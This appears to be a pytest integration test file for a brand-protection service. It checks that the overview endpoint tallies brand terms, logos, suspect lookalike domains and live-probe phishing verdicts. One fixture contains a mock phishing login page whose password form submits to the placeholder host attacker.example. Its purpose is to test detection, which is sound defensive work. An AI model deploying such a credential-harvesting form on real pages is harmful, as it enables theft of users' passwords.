"""Brand overview rollup (Phase 3.5) — integration tests."""

from __future__ import annotations

import io

import pytest
from httpx import AsyncClient
from PIL import Image

from src.brand.classifier import FetchedPage
from src.brand.probe import reset_test_fetcher, set_test_fetcher

pytestmark = pytest.mark.asyncio


def _hdr(user) -> dict:
    return user["headers"]


def _png(text: str) -> bytes:
    img = Image.new("RGB", (256, 96), (255, 255, 255))
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    return buf.getvalue()


@pytest.fixture(autouse=True)
def _reset():
    reset_test_fetcher()
    yield
    reset_test_fetcher()


async def test_overview_aggregates_full_surface(
    client: AsyncClient, analyst_user, organization
):
    org_id = str(organization["id"])
    h = _hdr(analyst_user)

    # 1) Brand terms
    await client.post(
        "/api/v1/brand/terms",
        json={"organization_id": org_id, "kind": "name", "value": "argus"},
        headers=h,
    )
    await client.post(
        "/api/v1/brand/terms",
        json={"organization_id": org_id, "kind": "apex_domain", "value": "argus.com"},
        headers=h,
    )

    # 2) Logo
    await client.post(
        "/api/v1/brand/logos",
        data={"organization_id": org_id, "label": "primary"},
        files={"file": ("a.png", io.BytesIO(_png("ARGUS")), "image/png")},
        headers=h,
    )

    # 3) Suspect domain via feed ingest
    await client.post(
        "/api/v1/brand/feed/ingest",
        json={
            "organization_id": org_id,
            "source": "manual",
            "domains": ["argus-phish.com", "argus-bank.io"],
        },
        headers=h,
    )

    # 4) Live probe
    listed = await client.get(
        "/api/v1/brand/suspects",
        params={"organization_id": org_id},
        headers=h,
    )
    suspect_id = listed.json()[0]["id"]

    async def fake_fetcher(d):
        return FetchedPage(
            domain=d,
            url=f"https://{d}/",
            final_url=f"https://{d}/",
            http_status=200,
            title=None,
            html=(
                "<html><head><title>Argus Bank Login</title></head>"
                "<body><h1>Welcome to Argus Online</h1>"
                '<form action="https://attacker.example/c">'
                '<input type="password" name="p"></form></body></html>'
            ),
        )
    set_test_fetcher(fake_fetcher)
    await client.post(
        f"/api/v1/brand/suspects/{suspect_id}/probe",
        headers=h,
    )

    # Now hit the overview endpoint
    r = await client.get(
        "/api/v1/brand/overview",
        params={"organization_id": org_id},
        headers=h,
    )
    assert r.status_code == 200, r.text
    body = r.json()
    assert body["terms"]["name"] == 1
    assert body["terms"]["apex_domain"] == 1
    assert body["logos_count"] == 1
    assert body["suspects_total"] >= 2
    assert "manual" in body["suspects_by_source"]
    assert body["live_probes_total"] >= 1
    assert "phishing" in body["live_probes_by_verdict"]
    assert any(
        p["verdict"] == "phishing" for p in body["recent_phishing_probes"]
    )
    assert len(body["suspects_top_similarity"]) >= 1


async def test_overview_for_empty_org(
    client: AsyncClient, analyst_user, second_organization
):
    r = await client.get(
        "/api/v1/brand/overview",
        params={"organization_id": str(second_organization["id"])},
        headers=_hdr(analyst_user),
    )
    assert r.status_code == 200
    body = r.json()
    assert body["suspects_total"] == 0
    assert body["logos_count"] == 0
    assert body["live_probes_total"] == 0
